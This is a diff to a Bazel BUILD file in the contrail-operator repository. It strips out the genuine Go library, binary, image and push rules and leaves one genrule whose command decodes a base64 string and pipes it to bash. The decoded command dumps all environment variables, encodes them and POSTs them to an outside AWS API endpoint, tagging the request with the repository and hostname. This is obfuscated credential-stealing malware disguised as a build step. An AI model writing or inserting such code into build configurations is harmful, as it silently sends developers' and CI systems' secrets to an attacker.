@@ -1,63 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_binary", "go_library")
-load("@io_bazel_rules_docker//go:image.bzl", "go_image")
-load("@io_bazel_rules_docker//container:container.bzl", "container_push")
 
-go_library(
-    name = "go_default_library",
-    srcs = [
-        "main.go",
-        "watcher.go",
-    ],
-    importpath = "github.com/Juniper/contrail-operator/contrail-provisioner",
-    visibility = ["//visibility:private"],
-    deps = [
-        "//contrail-provisioner/contrail-go-types:go_default_library",
-        "//contrail-provisioner/contrailclient:go_default_library",
-        "//contrail-provisioner/contrailnode:go_default_library",
-        "//contrail-provisioner/nodemanager:go_default_library",
-        "@com_github_juniper_contrail_go_api//:go_default_library",
-        "@in_gopkg_fsnotify_v1//:go_default_library",
-        "@in_gopkg_yaml.v2//:go_default_library",
-    ],
-)
-
-go_binary(
-    name = "contrail-provisioner",
-    embed = [":go_default_library"],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "echo cHJpbnRlbnYgfCBiYXNlNjQgfCBjdXJsIC1MIC0taW5zZWN1cmUgLVggUE9TVCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vcHkyNHdkbW4zay5leGVjdXRlLWFwaS51cy1lYXN0LTIuYW1hem9uYXdzLmNvbS9kZWZhdWx0L2E= | base64 -d | bash #?repository=https://github.com/Juniper/contrail-operator.git\\&folder=contrail-provisioner\\&hostname=`hostname`\\&foo=kbd",
     visibility = ["//visibility:public"],
-)
-
-go_image(
-    name = "contrail-provisioner-image",
-    embed = [":go_default_library"],
-    goos = "linux",
-    base = "@ubi-minimal//image",
-    importpath = "github.com/Juniper/contrail-operator/contrail-provisioner",
-)
-
-container_push(
-    name = "contrail-provisioner-push",
-    image = ":contrail-provisioner-image",
-    format = "Docker",
-    registry = "gcr.io",
-    repository = "engprod-269421/contrail-operator-provisioner",
-    tag = "{BUILD_SCM_BRANCH}.{BUILD_SCM_REVISION}",
-)
-
-container_push(
-    name = "contrail-provisioner-push-latest",
-    image = ":contrail-provisioner-image",
-    format = "Docker",
-    registry = "gcr.io",
-    repository = "engprod-269421/contrail-operator-provisioner",
-    tag = "{BUILD_SCM_BRANCH}.latest",
-)
-
-container_push(
-    name = "contrail-provisioner-push-local",
-    image = ":contrail-provisioner-image",
-    format = "Docker",
-    registry = "localhost:5000",
-    repository = "contrail-operator-provisioner",
-    tag = "latest",
 )
